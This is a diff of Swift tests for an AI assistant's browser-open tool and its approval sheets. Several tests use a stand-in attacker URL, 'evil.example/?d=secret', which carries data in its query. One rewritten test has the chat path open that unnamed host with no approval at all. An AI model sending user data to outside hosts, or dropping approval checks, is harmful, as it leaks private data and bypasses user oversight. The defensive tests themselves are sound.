@@ -54,36 +54,44 @@ private func open(_ url: String) -> String { #"{"url":"\#(url)"}"# }
     expectEq(r.opens, 1, "un frame open")
 }
 
-@Test func openOfAHostTheUserDidNotNameAsksAndCarriesNoData() async {
+@Test func openOfAHostTheUserDidNotNameActsInTheChatWithNoSheet() async {
     let r = rig()
     let args = open("https://evil.example/?d=secret")
-    guard let asked = r.chat.approval(for: call("browser_open", args), said: "abre sf.example") else {
-        Issue.record("un host que no dijo debe pedir hoja"); return
+    expect(r.chat.approval(for: call("browser_open", args), said: "busca el clima") == nil, "abrir es navegar: sin hoja")
+    let out = await r.chat.execute(name: "browser_open", argumentsJSON: args)
+    expect(out.ok && r.opens == 1, "abre con el ticket emitido")
+}
+
+@Test func openOfAHostTheUserDidNotNameAsksOnTheBridgeAndCarriesNoData() async {
+    let r = rig()
+    let args = open("https://evil.example/?d=secret")
+    guard let asked = r.bridge.approval(for: call("browser_open", args), said: "abre sf.example") else {
+        Issue.record("el puente conserva su hoja"); return
     }
     expectEq(asked.toolName, "browser_open", "es la hoja del open")
     expect(asked.summary.contains("evil.example"), "nombra el host: \(asked.summary)")
     expect(!asked.summary.contains("secret"), "sin la query en la hoja")
-    r.chat.granted(asked)
-    let out = await r.chat.execute(name: "browser_open", argumentsJSON: args)
+    r.bridge.granted(asked)
+    let out = await r.bridge.execute(name: "browser_open", argumentsJSON: args)
     expect(out.ok && r.opens == 1, "con un si, abre")
 }
 
 @Test func aDeniedOpenSendsNoOpenFrame() async {
     let r = rig()
     let args = open("https://evil.example/?d=secret")
-    _ = r.chat.approval(for: call("browser_open", args), said: "")
-    let out = await r.chat.execute(name: "browser_open", argumentsJSON: args)
+    _ = r.bridge.approval(for: call("browser_open", args), said: "")
+    let out = await r.bridge.execute(name: "browser_open", argumentsJSON: args)
     expect(!out.ok && out.output.contains("approval_required"), "sin ticket no corre")
     expectEq(r.opens, 0, "cero frames open")
 }
 
 @Test func anOpenTicketIsBoundToTheExactURL() async {
     let r = rig()
-    guard let asked = r.chat.approval(for: call("browser_open", open("https://a.example/")), said: "") else {
+    guard let asked = r.bridge.approval(for: call("browser_open", open("https://a.example/")), said: "") else {
         Issue.record("debia pedir hoja"); return
     }
-    r.chat.granted(asked)
-    let out = await r.chat.execute(name: "browser_open", argumentsJSON: open("https://evil.example/"))
+    r.bridge.granted(asked)
+    let out = await r.bridge.execute(name: "browser_open", argumentsJSON: open("https://evil.example/"))
     expect(!out.ok, "el si de una URL no abre otra")
     expectEq(r.opens, 0, "cero frames")
 }
